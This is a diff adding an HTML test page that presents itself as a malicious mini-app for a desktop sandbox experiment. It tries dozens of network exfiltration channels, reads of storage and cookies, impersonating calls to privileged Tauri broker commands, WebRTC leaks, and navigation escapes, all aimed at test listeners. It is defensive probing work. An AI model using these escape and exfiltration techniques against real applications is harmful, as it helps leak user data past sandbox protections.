@@ -1,0 +1,166 @@
+<!doctype html>
+<!--
+  A malicious mini-app for the Desktop sandbox spike (WISP 12xx). It tries every way out it knows and writes
+  down what it saw in window.__results; measure.mjs reads that through the test driver and checks its own
+  listeners for what actually arrived. window.__PROBE (set by measure.mjs before this entry) says where the
+  listeners are, which group of tries to run and which commands to call.
+-->
+<html><head><meta charset="utf-8"><title>Not a game</title></head>
+<body>
+<p>Nothing to see here.</p>
+<script>
+(() => {
+  const P = window.__PROBE;
+  const R = (window.__results = { group: P.group, checks: {}, errors: [] });
+  const set = (name, value) => { R.checks[name] = value; };
+  const tryTo = (name, f) => { try { const v = f(); set(name, v === undefined ? "ran" : v); } catch (e) { set(name, "threw " + (e && e.name) + ": " + (e && e.message)); } };
+  const http = (probe) => `http://${P.host}:${P.http}/${P.nonce}/${probe}`;
+  const add = (html) => { const d = document.createElement("div"); d.innerHTML = html; document.body.appendChild(d); return d; };
+  const later = (ms) => new Promise((r) => setTimeout(r, ms));
+  const settle = (p, ms = 3000) => Promise.race([p, later(ms).then(() => "pending")]);
+  const errorText = (e) => "error: " + (e && e.message ? e.message : String(e));
+  const internals = window.__TAURI_INTERNALS__;
+
+  // A peer connection that gathers candidates against our STUN (UDP) and TURN (TCP) listeners.
+  const rtc = async (Ctor) => {
+    if (typeof Ctor !== "function") return "no constructor";
+    const pc = new Ctor({ iceServers: [
+      { urls: `stun:${P.lan}:${P.udp}` },
+      { urls: `stun:127.0.0.1:${P.udp}` },
+      { urls: `turn:${P.lan}:${P.turn}?transport=tcp`, username: "u", credential: "p" },
+    ] });
+    pc.createDataChannel("x");
+    await pc.setLocalDescription(await pc.createOffer());
+    await later(2500);
+    const sdp = (pc.localDescription && pc.localDescription.sdp) || "";
+    pc.close();
+    return "created; candidates in offer: " + (sdp.match(/a=candidate/g) || []).length;
+  };
+
+  const groups = {
+    async net() {
+      // (a) Where the page is.
+      tryTo("origin", () => self.origin);
+      tryTo("location", () => location.href);
+      tryTo("document.domain", () => document.domain);
+      tryTo("localStorage", () => { localStorage.setItem("x", "1"); return "readable: " + localStorage.getItem("m0-secret"); });
+      tryTo("document.cookie", () => { document.cookie = "a=1"; return "cookie: " + document.cookie; });
+      set("indexedDB", await settle(new Promise((resolve) => {
+        try { const r = indexedDB.open("x"); r.onsuccess = () => resolve("opened"); r.onerror = () => resolve("refused: " + (r.error && r.error.name)); }
+        catch (e) { resolve("threw " + e.name); }
+      })));
+      tryTo("opener", () => String(window.opener));
+      tryTo("top is self", () => window.top === window && window.parent === window);
+      tryTo("BroadcastChannel", () => { new BroadcastChannel("ghostly").postMessage("from the app " + P.nonce); return "posted"; });
+      tryTo("tauri internals", () => typeof internals + (internals ? " label " + internals.metadata.currentWindow.label : ""));
+      tryTo("window.ghostly", () => typeof window.ghostly);
+      tryTo("RTC names left", () => Object.getOwnPropertyNames(window).filter((n) => /RTC/.test(n)).join(",") || "none");
+
+      // (d) The broker, and every other command.
+      if (internals) {
+        set("broker context", await settle(internals.invoke("app_broker", { request: { type: "context", args: { app: "someone/else", window: "app-0000000000000000" } } }).then((v) => JSON.stringify(v), errorText)));
+        set("broker start again", await settle(internals.invoke("app_broker", { request: { type: "start", args: null } }).then(() => "answered", errorText)));
+        const refused = [], answered = [];
+        for (const cmd of P.commands) {
+          const out = await settle(internals.invoke(cmd, {}).then(() => "answered", errorText), 1500);
+          (/not allowed|not found|Not allowed/.test(out) ? refused : answered).push(cmd + " (" + out + ")");
+        }
+        set("other commands refused", refused.length);
+        set("other commands answered", answered.join("; ") || "none");
+      }
+
+      // (b) Every way to the network.
+      tryTo("fetch", () => { fetch(http("fetch"), { mode: "no-cors" }).catch(() => {}); });
+      tryTo("fetch data:", () => { fetch("data:text/plain,x").then(() => set("fetch data: result", "fetched"), (e) => set("fetch data: result", errorText(e))); });
+      tryTo("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", http("xhr")); x.send(); });
+      tryTo("img", () => { new Image().src = http("img"); });
+      add(`<img srcset="${http("img-srcset")} 1x">`);
+      add(`<style>body{background:url(${http("css-url")})}</style>`);
+      add(`<style>@import url(${http("css-import")});</style>`);
+      add(`<style>@font-face{font-family:m0;src:url(${http("font")})}</style><span style="font-family:m0">x</span>`);
+      add(`<link rel="stylesheet" href="${http("link-stylesheet")}">`);
+      add(`<link rel="prefetch" href="${http("link-prefetch")}">`);
+      add(`<link rel="preload" as="image" href="${http("link-preload")}">`);
+      add(`<link rel="preconnect" href="http://${P.host}:${P.tcp}">`);
+      add(`<link rel="preconnect" href="http://${P.lan}:${P.tcp}">`);
+      // A name that never resolves: a proxy, if the window has one, sees it; otherwise only a DNS question would.
+      add(`<link rel="preconnect" href="http://${P.nonce}-preconnect.invalid">`);
+      tryTo("fetch by name", () => { fetch(`http://${P.nonce}-fetch.invalid/`, { mode: "no-cors" }).catch(() => {}); });
+      add(`<link rel="dns-prefetch" href="//${P.dnsName}">`);
+      add(`<a href="http://${P.dnsName}/">a link whose host could be prefetched</a>`);
+      add(`<script src="${http("script-src")}"><\/script>`);
+      add(`<iframe src="${http("iframe-src")}"></iframe>`);
+      add(`<object data="${http("object")}"></object><embed src="${http("embed")}">`);
+      add(`<video src="${http("video")}" preload="auto"></video><audio src="${http("audio")}" preload="auto"></audio>`);
+      add(`<input type="image" src="${http("input-image")}">`);
+      add(`<svg><image href="${http("svg-image")}" width="1" height="1"/></svg>`);
+      tryTo("websocket", () => { new WebSocket(`ws://${P.host}:${P.http}/${P.nonce}/websocket`); });
+      tryTo("eventsource", () => { new EventSource(http("eventsource")); });
+      tryTo("sendBeacon", () => navigator.sendBeacon(http("beacon"), "x"));
+      tryTo("worker", () => { new Worker(http("worker")); });
+      tryTo("blob worker", () => { new Worker(URL.createObjectURL(new Blob([`fetch("${http("blob-worker-fetch")}")`]))); });
+      tryTo("service worker", () => { navigator.serviceWorker.register(http("sw")).catch(() => {}); return "asked"; });
+      tryTo("import()", () => { import(http("import")).catch(() => {}); });
+
+      // (c) WebRTC: here, and in fresh frames that bring their own globals.
+      set("rtc here", await settle(rtc(window.RTCPeerConnection).catch(errorText), 5000));
+      const blank = document.createElement("iframe");
+      document.body.appendChild(blank);
+      tryTo("about:blank frame RTC", () => { const w = blank.contentWindow; return w ? typeof w.RTCPeerConnection : "no window"; });
+      let blankCtor;
+      try { blankCtor = blank.contentWindow && blank.contentWindow.RTCPeerConnection; } catch (e) { blankCtor = undefined; }
+      set("about:blank frame rtc", await settle(rtc(blankCtor).catch(errorText), 5000));
+      const fromFrame = new Promise((resolve) => addEventListener("message", (e) => { if (e.data && e.data.m0) resolve(e.data.m0); }));
+      const srcdoc = document.createElement("iframe");
+      srcdoc.srcdoc = `<script>
+        const P = ${JSON.stringify(P)};
+        const report = (v) => parent.postMessage({ m0: v }, "*");
+        (async () => {
+          const out = { origin: self.origin, rtcType: typeof RTCPeerConnection, internals: typeof window.__TAURI_INTERNALS__ };
+          try {
+            if (typeof RTCPeerConnection === "function") {
+              const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + P.lan + ":" + P.udp }, { urls: "turn:" + P.lan + ":" + P.turn + "?transport=tcp", username: "u", credential: "p" }] });
+              pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer());
+              await new Promise((r) => setTimeout(r, 2500)); out.rtc = "created"; pc.close();
+            }
+          } catch (e) { out.rtc = "threw " + e.message; }
+          try { fetch("http://" + P.host + ":" + P.http + "/" + P.nonce + "/srcdoc-fetch").catch(() => {}); } catch (e) {}
+          try {
+            if (window.__TAURI_INTERNALS__) out.broker = await window.__TAURI_INTERNALS__.invoke("app_broker", { request: { type: "context", args: null } }).then((v) => JSON.stringify(v), (e) => "error: " + e);
+          } catch (e) { out.broker = "threw " + e.message; }
+          report(out);
+        })();
+      <\/script>`;
+      document.body.appendChild(srcdoc);
+      set("srcdoc frame", await settle(fromFrame.then((v) => JSON.stringify(v)), 8000));
+      tryTo("srcdoc frame RTC from parent", () => { const w = srcdoc.contentWindow; return w ? typeof w.RTCPeerConnection : "no window"; });
+      add(`<iframe src="data:text/html,<script>fetch('${http("data-frame-fetch")}')<\/script>"></iframe>`);
+      tryTo("blob frame", () => { const f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob([`<script>fetch("${http("blob-frame-fetch")}")<\/script>`], { type: "text/html" })); document.body.appendChild(f); });
+      await later(3000);
+    },
+
+    // (e) Escapes, one per window: each may take the page away.
+    "nav-top": async () => { location.href = http("nav-top"); },
+    "nav-tauri": async () => { location.href = "tauri://localhost/"; },
+    "nav-reload": async () => { location.reload(); },
+    "nav-meta": async () => { add(`<meta http-equiv="refresh" content="0;url=${http("nav-meta")}">`); },
+    "nav-form": async () => { const d = add(`<form method="post" action="${http("nav-form")}"><input name="secret" value="x"></form>`); d.querySelector("form").submit(); },
+    "nav-form-blank": async () => { const d = add(`<form method="post" target="_blank" action="${http("nav-form-blank")}"><input name="secret" value="x"></form>`); d.querySelector("form").submit(); },
+    "nav-open": async () => { set("window.open", String(window.open(http("nav-open")))); },
+    "nav-link-blank": async () => { add(`<a id="l" target="_blank" href="${http("nav-link-blank")}">x</a>`).querySelector("a").click(); },
+    "nav-ping": async () => { add(`<a id="l" ping="${http("nav-ping-ping")}" href="${http("nav-ping-href")}">x</a>`).querySelector("a").click(); },
+    "nav-frame-top": async () => {
+      const f = document.createElement("iframe");
+      f.srcdoc = `<script>try { top.location.href = "${http("nav-frame-top")}"; } catch (e) { parent.postMessage({ m0: "threw " + e.message }, "*"); }<\/script>`;
+      addEventListener("message", (e) => { if (e.data && e.data.m0) set("frame top", e.data.m0); });
+      document.body.appendChild(f);
+    },
+  };
+
+  (async () => {
+    try { await groups[P.group](); } catch (e) { R.errors.push(String(e)); }
+    R.done = true;
+  })();
+})();
+</script>
+</body></html>
